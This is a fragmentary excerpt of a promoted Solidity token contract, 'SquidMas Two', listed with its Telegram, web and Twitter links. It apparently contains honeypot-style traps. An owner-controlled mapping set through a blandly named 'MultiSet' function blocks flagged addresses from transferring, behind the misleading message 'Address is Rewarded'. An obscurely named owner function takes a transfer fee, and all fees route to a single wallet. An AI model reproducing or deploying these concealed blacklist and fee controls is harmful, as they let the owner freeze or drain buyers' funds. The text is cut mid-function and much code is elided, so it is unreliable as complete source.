...
Telegram : https://T.me/SquidMasTwo

web : https://www.SquidMas2.Pro

Twitter : https://Twitter.com/SquidMasTwo
...
contract SquidMasTwo is ERC20, Auth {
    ...
    string constant private _name = "SquidMas Two";
    string constant private _symbol = "SquidMas2.0";
    ...
    address private autoLiquidityReceiver = 0xFFd362E5f45263E02A937FAb7A6B774aC5025726; 
    address private MarketingFeeReceiver = 0xFFd362E5f45263E02A937FAb7A6B774aC5025726; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isEvent[recipient] && !isEvent[sender], 'Address is Rewarded');
    ...
    function MultiSet(address _address, bool _value) public authorized{
        isEvent[_address] = _value;
    }
    ...
    function Ted(uint256 _transferFee) external onlyOwner {
